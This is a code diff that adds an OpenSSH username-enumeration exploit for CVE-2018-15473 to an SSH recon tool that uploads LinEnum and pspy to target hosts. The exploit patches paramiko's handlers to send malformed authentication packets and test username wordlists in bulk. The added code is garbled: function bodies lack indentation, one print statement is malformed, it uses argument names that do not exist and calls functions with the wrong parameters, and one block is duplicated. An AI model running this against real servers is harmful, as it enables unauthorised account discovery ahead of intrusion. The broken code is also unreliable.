@@ -5,6 +5,10 @@
 #https://github.com/plasticuproject/rest
 #Thanks to mikesz81 for concept and nbulischeck for code review
 
+#Username module:       Dividesbyzer0
+#Original CVE:          CVE-2018-15473 (Credit to Justin Gardner)
+#Username enumeration:  OpenSSH version < 7.7
+#DISCLAIMER:            Use responsibly with permission. Don't be a Skid.
 
 from termcolor import cprint
 import subprocess
@@ -12,6 +16,11 @@ import paramiko
 import argparse
 import pathlib
 import re
+import multiprocessing
+import sys
+import json
+import socket
+import logging
 
 
 badpacks = ('centos','debian','ubuntu','redhat','addon','agent','apps','base','bin','bsd','cache','check','client','command',
@@ -32,6 +41,32 @@ ssh_errors = (paramiko.ssh_exception.AuthenticationException,
               paramiko.ssh_exception.SSHException)
 
 
+# store function we will overwrite to malform the packet
+old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
+
+# create custom exception for Bad usernames
+class BadUsername(Exception):
+    def __init__(self):
+        pass
+
+# create malicious "add_boolean" function to malform packet
+def add_boolean(*args, **kwargs):
+    pass
+
+# create function to call when username was invalid
+def call_error(*args, **kwargs):
+    raise BadUsername()
+
+#create the malicious function to overwrite MSG_SERVICE_ACCEPT handler
+def malform_packet(*args, **kwargs):
+    old_add_boolean = paramiko.message.Message.add_boolean
+    paramiko.message.Message.add_boolean = add_boolean
+    result  = old_parse_service_accept(*args, **kwargs)
+    #return old add_boolean function so start_client will work again
+    paramiko.message.Message.add_boolean = old_add_boolean
+    return result
+
+
 def info():
 
     #print tool information
@@ -46,10 +81,12 @@ def get_args():
 
     # parse arguments
     parser = argparse.ArgumentParser(description=info())
+    group = parser.add_mutually_exclusive_group()
+    group.add_argument('-u', 'user', '--user', type = str, metavar='username', help='username used to login to host or a single username to enumerate')
+    group.add_argument('-U', '--userlist', type = str, help = 'Give a file containing a list of users')
     parser.add_argument('host', type=str, metavar='hostname', help='hostname or IP address of remote machine')
-    parser.add_argument('user', type=str, metavar='username', help='username used to login to host')
-    parser.add_argument('-n', type=int, metavar='port_number', nargs='?', help='port number (default is 22)', default=22)
-    parser.add_argument('-p', type=str, metavar='password', help='password for user')
+    parser.add_argument('-P', '--port', type=int, metavar='port_number', nargs='?', help='port number (default is 22)', default=22)
+    parser.add_argument('-p', '--password', type=str, metavar='password', help='password for user')
     parser.add_argument('-k', type=str, metavar='key_file', help='location of RSA or DSA Key file')
     parser.add_argument('-ss', action='store_true', help='run package list against searchsploit database')
     parser.add_argument('-le', action='store_true', help='run LinEnum.sh and return LE_report')
@@ -166,6 +203,64 @@ def password_connect(hostname, user, secret, port_num, lin_enum, lin_enum_t, psp
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     ssh.connect(hostname, username=user, password=secret, port=port_num)
     transfer(ssh, lin_enum, lin_enum_t, pspy)
+
+
+def get_banner(host, port):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh.connect(hostname = host, port = port, username = 'invalidinvalidinvalid', password = 'invalidinvalidinvalid')
+    except:
+        banner = ssh.get_transport().remote_version
+        ssh.close()
+    return banner
+
+
+def nopass_connect(host, port, user):
+sock = socket.socket()
+try:
+    sock.connect((args.hostname, args.port))
+    sock.close()
+except socket.error:
+    print('[-] Connecting to host failed. Please check the specified host and port.')
+    sys.exit(1)
+if args.user: #single username passed in
+	result = checkUsername(args.user)
+	if result[1]:
+		print(result[0]+" is a valid user!")
+	else:
+		print(result[0]+" is not a valid user!")
+elif args.userList: #username list passed in
+	try:
+		f = open(args.userList)
+	except IOError:
+		print("[-] File doesn't exist or is unreadable.")
+		sys.exit(3)
+	usernames = map(str.strip, f.readlines())
+	f.close()
+	# map usernames to their respective threads
+	pool = multiprocessing.Pool(args.threads)
+	results = pool.map(checkUsername, usernames)
+	try:
+		outputFile = open(args.outputFile, "w")
+	except IOError:
+		print("[-] Cannot write to outputFile.")
+		sys.exit(5)
+	if args.outputFormat=='list':
+		outputFile.writelines(exportList(results))
+		print("[+] Results successfully written to " + args.outputFile + " in List form.")
+	elif args.outputFormat=='json':
+		outputFile.writelines(exportJSON(results))
+		print("[+] Results successfully written to " + args.outputFile + " in JSON form.")
+	elif args.outputFormat=='csv':
+		outputFile.writelines(exportCSV(results))
+		print("[+] Results successfully written to " + args.outputFile + " in CSV form.")
+	else:
+		print("".join(results))
+	outputFile.close()
+else: # no usernames passed in
+	print("[-] No usernames provided to check")
+	sys.exit(4)
 
 
 def key_file_connect(hostname, user, port_num, secret, key_file, lin_enum, lin_enum_t, pspy):
@@ -312,6 +407,113 @@ def clean_old(lin_enum, pspy, ss):
             path.unlink()
 
 
+def checkUsername(username, tried=0):
+# create function to perform authentication with malformed packet and desired username
+    sock = socket.socket()
+	sock.connect((args.hostname, args.port))
+	# instantiate transport
+	transport = paramiko.transport.Transport(sock)
+	try:
+	    transport.start_client()
+	except paramiko.ssh_exception.SSHException:
+	    # server was likely flooded, retry up to 3 times
+	    transport.close()
+	    if tried < 4:
+	    	tried += 1
+	    	return checkUsername(username, tried)
+	    else:
+	    	print('[-] Failed to negotiate SSH transport')
+	try:
+		transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
+	except BadUsername:
+    		return (username, False)
+	except paramiko.ssh_exception.AuthenticationException:
+    		return (username, True)
+	#Successful auth(?)
+	raise Exception("There was an error. Is this the correct version of OpenSSH?")
+
+
+def exportJSON(results):
+	data = {"Valid":[], "Invalid":[]}
+	for result in results:
+		if result[1] and result[0] not in data['Valid']:
+			data['Valid'].append(result[0])
+		elif not result[1] and result[0] not in data['Invalid']:
+			data['Invalid'].append(result[0])
+	return json.dumps(data)
+
+
+def exportCSV(results):
+	final = "Username, Valid\n"
+	for result in results:
+		final += result[0]+", "+str(result[1])+"\n"
+	return final
+
+
+def exportList(results):
+	final = ""
+	for result in results:
+		if result[1]:
+			final+=result[0]+" is a valid user!\n"
+		else:
+			final+=result[0]+" is not a valid user!\n"
+	return final
+
+# assign functions to respective handlers
+paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
+paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
+
+# get rid of paramiko logging
+logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
+
+def enum_user():
+sock = socket.socket()
+try:
+    sock.connect((args.hostname, args.port))
+    sock.close()
+except socket.error:
+    print'[-] Connecting to host failed. Please check the specified host and port.')
+    sys.exit(1)
+
+if args.username: #single username passed in
+	result = checkUsername(args.username)
+	if result[1]:
+		print(result[0]+" is a valid user!")
+	else:
+		print(result[0]+" is not a valid user!")
+elif args.userList: #username list passed in
+	try:
+		f = open(args.userList)
+	except IOError:
+		print("[-] File doesn't exist or is unreadable.")
+		sys.exit(3)
+	usernames = map(str.strip, f.readlines())
+	f.close()
+	# map usernames to their respective threads
+	pool = multiprocessing.Pool(args.threads)
+	results = pool.map(checkUsername, usernames)
+	try:
+		outputFile = open(args.outputFile, "w")
+	except IOError:
+		print("[-] Cannot write to outputFile.")
+		sys.exit(5)
+	if args.outputFormat=='list':
+		outputFile.writelines(exportList(results))
+		print("[+] Results successfully written to " + args.outputFile + " in List form.")
+	elif args.outputFormat=='json':
+		outputFile.writelines(exportJSON(results))
+		print("[+] Results successfully written to " + args.outputFile + " in JSON form.")
+	elif args.outputFormat=='csv':
+		outputFile.writelines(exportCSV(results))
+		print("[+] Results successfully written to " + args.outputFile + " in CSV form.")
+	else:
+		print("".join(results))
+	outputFile.close()
+else: # no usernames passed in
+	print("[-] No usernames provided to check")
+	sys.exit(4)
+
+
 def main():
 
     # run program
@@ -320,10 +522,13 @@ def main():
         try:
             if args.k == None:
                 clean_old(args.le, args.ps, args.ss)
-                password_connect(args.host, args.user, args.p, args.n, args.le, args.t, args.ps)
+                if args.p == None:
+                    enum_user(args.host, args.P, args.user)
+                elif args.p != None:
+                    password_connect(args.host, args.user, args.p, args.P, args.le, args.t, args.ps)
             elif args.k != None:
                 clean_old(args.le, args.ps)
-                key_file_connect(args.host, args.user, args.p, args.n, args.k, args.le, args.t, args.ps)
+                key_file_connect(args.host, args.user, args.p, args.P, args.k, args.le, args.t, args.ps)
         except ssh_errors as e:
             print(e)
             cprint('[*]Could not connect to {}.[*]'.format(args.host), 'red')
@@ -339,4 +544,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
